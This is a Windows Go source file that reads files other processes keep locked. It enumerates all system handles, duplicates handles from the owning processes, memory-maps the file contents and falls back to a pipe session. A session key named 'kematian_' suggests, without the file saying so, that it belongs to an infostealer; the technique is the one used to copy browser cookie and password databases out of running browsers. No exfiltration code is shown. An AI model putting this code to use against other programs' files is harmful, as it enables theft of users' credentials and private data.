//go:build windows

package platform

import (
	"fmt"
	"os"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	SystemExtendedHandleInformation = 64
	fileTypeDisk2                   = 0x0001
	pageReadonly2                   = 0x02
	fileMapRead2                    = 0x04
)

type systemHandleInfoEx struct {
	NumberOfHandles uintptr
	Handles         [1]systemHandleEntry
}

type systemHandleEntry struct {
	UniqueProcessId       uintptr
	CreatorBackTraceIndex uint16
	ObjectTypeIndex       int16
	HandleAttributes      int32
	HandleValue           uintptr
	Object                uintptr
	GrantedAccess         uint32
}

type rmUniqueProcess2 struct {
	ProcessId        uint32
	ProcessStartTime syscall.Filetime
}

type rmProcessInfo2 struct {
	Process          rmUniqueProcess2
	AppName          [256]uint16
	ServiceShortName [64]uint16
	ApplicationType  uint32
	AppStatus        uint32
	TSSessionId      uint32
	Restartable      int32
}

var (
	modNtdll2                    = windows.NewLazySystemDLL("ntdll.dll")
	procNtQuerySystemInformation = modNtdll2.NewProc("NtQuerySystemInformation")
	modKernel32                  = windows.NewLazySystemDLL("kernel32.dll")
	procGetFileSizeEx            = modKernel32.NewProc("GetFileSizeEx")
	procCreateFileMappingW       = modKernel32.NewProc("CreateFileMappingW")
	procMapViewOfFile            = modKernel32.NewProc("MapViewOfFile")
	procUnmapViewOfFile          = modKernel32.NewProc("UnmapViewOfFile")
	procGetFinalPathNameByHandle = modKernel32.NewProc("GetFinalPathNameByHandleW")
	procGetFileType              = modKernel32.NewProc("GetFileType")
	modRstrtmgr                  = windows.NewLazySystemDLL("rstrtmgr.dll")
	procRmStartSession           = modRstrtmgr.NewProc("RmStartSession")
	procRmEndSession             = modRstrtmgr.NewProc("RmEndSession")
	procRmRegisterResources      = modRstrtmgr.NewProc("RmRegisterResources")
	procRmGetList                = modRstrtmgr.NewProc("RmGetList")
)

var (
	handleCacheMu  sync.Mutex
	handleCacheVal []systemHandleEntry
)

func cachedSystemHandles() ([]systemHandleEntry, error) {
	handleCacheMu.Lock()
	defer handleCacheMu.Unlock()
	if handleCacheVal != nil {
		return handleCacheVal, nil
	}
	h, err := querySystemHandles()
	if err != nil {
		return nil, err
	}
	handleCacheVal = h
	return h, nil
}

func ResetHandleCache() {
	handleCacheMu.Lock()
	handleCacheVal = nil
	handleCacheMu.Unlock()
}

func ReadLockedFile(srcPath string, pids []uint32) ([]byte, error) {
	if data, err := os.ReadFile(srcPath); err == nil {
		logf("read directly: %s", srcPath)
		return data, nil
	}

	if lockPids := getProcessesLockingFile(srcPath); len(lockPids) > 0 {
		pids = mergePIDs(pids, lockPids)
	}

	if len(pids) > 0 {
		if data, err := readViaHandleDuplication(srcPath, pids); err == nil {
			logf("read via handle dup: %s", srcPath)
			return data, nil
		}
	}

	if ActivePipeSession != nil {
		if data, err := ActivePipeSession.ReadFile(srcPath); err == nil && len(data) > 0 {
			logf("read via pipe: %s (%d bytes)", srcPath, len(data))
			return data, nil
		}
	}

	return nil, fmt.Errorf("all read methods failed for: %s", srcPath)
}

func mergePIDs(a, b []uint32) []uint32 {
	seen := make(map[uint32]struct{}, len(a)+len(b))
	for _, p := range a {
		seen[p] = struct{}{}
	}
	result := append([]uint32(nil), a...)
	for _, p := range b {
		if _, ok := seen[p]; !ok {
			result = append(result, p)
			seen[p] = struct{}{}
		}
	}
	return result
}

func readViaHandleDuplication(srcPath string, pids []uint32) ([]byte, error) {
	handles, err := cachedSystemHandles()
	if err != nil {
		return nil, err
	}

	pidSet := make(map[uintptr]struct{}, len(pids))
	for _, p := range pids {
		pidSet[uintptr(p)] = struct{}{}
	}

	for _, h := range handles {
		if _, ok := pidSet[h.UniqueProcessId]; !ok {
			continue
		}

		hProcess, err := windows.OpenProcess(windows.PROCESS_DUP_HANDLE, false, uint32(h.UniqueProcessId))
		if err != nil {
			continue
		}

		var dupHandle windows.Handle
		err = windows.DuplicateHandle(hProcess, windows.Handle(h.HandleValue),
			windows.CurrentProcess(), &dupHandle, 0, false, windows.DUPLICATE_SAME_ACCESS)
		windows.CloseHandle(hProcess)
		if err != nil {
			continue
		}

		ft, _, _ := procGetFileType.Call(uintptr(dupHandle))
		if ft != fileTypeDisk2 {
			windows.CloseHandle(dupHandle)
			continue
		}

		handlePath := getHandlePath(uintptr(dupHandle))
		if handlePath == "" || !strings.EqualFold(handlePath, srcPath) {
			windows.CloseHandle(dupHandle)
			continue
		}

		data, err := readFileByMapping(dupHandle)
		windows.CloseHandle(dupHandle)
		if err == nil {
			return data, nil
		}
	}

	return nil, fmt.Errorf("handle duplication failed for %s", srcPath)
}

func readFileByMapping(h windows.Handle) ([]byte, error) {
	var fileSize int64
	ok, _, _ := procGetFileSizeEx.Call(uintptr(h), uintptr(unsafe.Pointer(&fileSize)))
	if ok == 0 || fileSize <= 0 {
		return nil, fmt.Errorf("empty or unreadable file")
	}

	hMapping, _, _ := procCreateFileMappingW.Call(uintptr(h), 0, pageReadonly2, 0, 0, 0)
	if hMapping == 0 {
		return nil, fmt.Errorf("CreateFileMappingW failed")
	}
	defer windows.CloseHandle(windows.Handle(hMapping))

	baseAddr, _, _ := procMapViewOfFile.Call(hMapping, fileMapRead2, 0, 0, uintptr(fileSize))
	if baseAddr == 0 {
		return nil, fmt.Errorf("MapViewOfFile failed")
	}
	defer procUnmapViewOfFile.Call(baseAddr)

	data := make([]byte, fileSize)
	copy(data, unsafe.Slice((*byte)(unsafe.Pointer(baseAddr)), fileSize))
	return data, nil
}

func querySystemHandles() ([]systemHandleEntry, error) {
	bufSize := uint32(1 * 1024 * 1024)
	for {
		buf := make([]byte, bufSize)
		var returnLength uint32
		status, _, _ := procNtQuerySystemInformation.Call(
			SystemExtendedHandleInformation,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(bufSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)
		if status&0xFFFFFFFF == 0xC0000004 {
			bufSize = returnLength + 65536
			if bufSize > 256*1024*1024 {
				return nil, fmt.Errorf("handle buffer too large")
			}
			continue
		}
		if status != 0 {
			return nil, fmt.Errorf("NtQuerySystemInformation: 0x%x", status)
		}

		info := (*systemHandleInfoEx)(unsafe.Pointer(&buf[0]))
		count := int(info.NumberOfHandles)
		handles := make([]systemHandleEntry, count)
		for i := 0; i < count; i++ {
			entry := (*systemHandleEntry)(unsafe.Pointer(
				uintptr(unsafe.Pointer(&info.Handles[0])) + uintptr(i)*unsafe.Sizeof(info.Handles[0]),
			))
			handles[i] = *entry
		}
		return handles, nil
	}
}

func getHandlePath(handle uintptr) string {
	buf := make([]uint16, 32768)
	n, _, _ := procGetFinalPathNameByHandle.Call(
		handle,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
	)
	if n == 0 || n >= uintptr(len(buf)) {
		return ""
	}
	s := syscall.UTF16ToString(buf[:n])
	if strings.HasPrefix(s, `\\?\`) {
		s = s[4:]
	}
	return s
}

func getProcessesLockingFile(filePath string) []uint32 {
	suffix := filePath
	if len(suffix) > 8 {
		suffix = suffix[len(suffix)-8:]
	}
	sessionKey, err := syscall.UTF16PtrFromString("kematian_" + suffix)
	if err != nil {
		return nil
	}

	var sessionHandle uint32
	ret, _, _ := procRmStartSession.Call(
		uintptr(unsafe.Pointer(&sessionHandle)), 0,
		uintptr(unsafe.Pointer(sessionKey)),
	)
	if ret != 0 {
		return nil
	}
	defer procRmEndSession.Call(uintptr(sessionHandle))

	filePathW, err := syscall.UTF16PtrFromString(filePath)
	if err != nil {
		return nil
	}
	ret, _, _ = procRmRegisterResources.Call(
		uintptr(sessionHandle), 1,
		uintptr(unsafe.Pointer(&filePathW)),
		0, 0, 0, 0,
	)
	if ret != 0 {
		return nil
	}

	var needed, count, rebootReason uint32
	ret, _, _ = procRmGetList.Call(
		uintptr(sessionHandle),
		uintptr(unsafe.Pointer(&needed)),
		uintptr(unsafe.Pointer(&count)),
		0,
		uintptr(unsafe.Pointer(&rebootReason)),
	)
	if ret != 234 || needed == 0 {
		return nil
	}

	infos := make([]rmProcessInfo2, needed)
	count = needed
	ret, _, _ = procRmGetList.Call(
		uintptr(sessionHandle),
		uintptr(unsafe.Pointer(&needed)),
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&infos[0])),
		uintptr(unsafe.Pointer(&rebootReason)),
	)
	if ret != 0 {
		return nil
	}

	pids := make([]uint32, 0, count)
	for i := uint32(0); i < count; i++ {
		pids = append(pids, infos[i].Process.ProcessId)
	}
	return pids
}
